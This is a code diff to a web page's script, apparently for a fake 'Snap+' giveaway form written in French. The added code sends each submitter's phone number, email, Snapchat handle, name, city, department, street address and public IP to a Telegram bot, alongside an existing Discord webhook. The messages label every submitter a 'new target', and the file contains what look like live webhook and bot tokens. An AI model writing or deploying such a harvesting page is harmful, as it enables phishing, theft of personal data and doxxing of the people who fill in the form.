@@ -127,6 +127,11 @@
 
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
+
+    // Ton token Telegram Bot et Chat ID Telegram (remplace par tes valeurs)
+    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+    const TELEGRAM_CHAT_ID = "-1002810249796";
+
     const SUBMISSION_LIMIT = 2;
     const TIME_WINDOW_MINUTES = 30;
 
@@ -160,6 +165,27 @@
       return true;
     }
 
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "Markdown",
+        disable_web_page_preview: true
+      };
+
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error("Erreur lors de l'envoi Telegram");
+      } catch (err) {
+        console.error("Telegram error:", err);
+      }
+    }
+
     document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
       e.preventDefault();
 
@@ -171,6 +197,7 @@
       const data = new FormData(this);
       const ip = await getPublicIP();
 
+      // Discord embed
       const embed = {
         title: "🎁 Nouvelle cible Snap+ @everyone",
         color: 0xA54FFB,
@@ -191,13 +218,42 @@
         timestamp: new Date(),
       };
 
+      // Telegram message (style encadré multi-parties)
+      const telegramMessage = `
+┌─🎁 *Nouvelle cible Snap+* @everyone
+
+│ ┌─📞 Contact
+│ │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
+│ │ ├─ Email     : ${data.get("email") || "N/A"}
+│ │ └─ Snapchat  : ${data.get("snap") || "N/A"}
+
+│ ├─👤 Identité
+│ │ ├─ Nom      : ${data.get("nom") || "N/A"}
+│ │ ├─ Prénom   : ${data.get("prenom") || "N/A"}
+
+│ ├─📍 Localisation
+│ │ ├─ Ville        : ${data.get("ville") || "N/A"}
+│ │ ├─ Département  : ${data.get("departement") || "N/A"}
+│ │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
+
+│ └─🌐 Autres
+│   └─ IP          : ${ip}
+
+└─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
+`;
+
+      // Envoi Discord
       fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] }),
       })
       .then((res) => {
-        if (!res.ok) throw new Error("Erreur lors de l'envoi");
+        if (!res.ok) throw new Error("Erreur lors de l'envoi Discord");
+        // Envoi Telegram ensuite
+        return sendToTelegram(telegramMessage);
+      })
+      .then(() => {
         window.location.href = "merci.html";
       })
       .catch((err) => {
